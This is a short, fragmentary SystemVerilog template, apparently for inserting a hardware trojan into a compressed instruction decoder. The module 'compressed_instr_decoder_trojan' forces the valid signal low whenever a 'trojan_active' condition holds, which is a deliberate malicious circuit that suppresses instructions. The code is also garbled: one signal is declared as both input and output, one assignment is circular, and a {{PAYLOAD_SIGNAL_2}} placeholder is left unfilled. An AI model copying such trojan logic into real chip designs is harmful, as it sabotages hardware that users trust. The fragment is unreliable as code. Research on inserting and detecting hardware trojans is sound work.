...
module compressed_instr_decoder_trojan (
    input  logic clk_i,
    input  logic rst_ni,
    
    // Original module signals (passthrough)
    input  logic compressed_valid_i,
    output logic compressed_valid_i,
    ...
    assign compressed_valid_i = trojan_active ? 1'b0 : compressed_valid_i_normal;
    ...
    logic compressed_valid_i_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign compressed_valid_i_normal = compressed_valid_i;
 ...
 *     input  logic instr_valid_i,   // compressed_valid_i
 *     output logic instr_valid_o    // compressed_valid_i
 * );
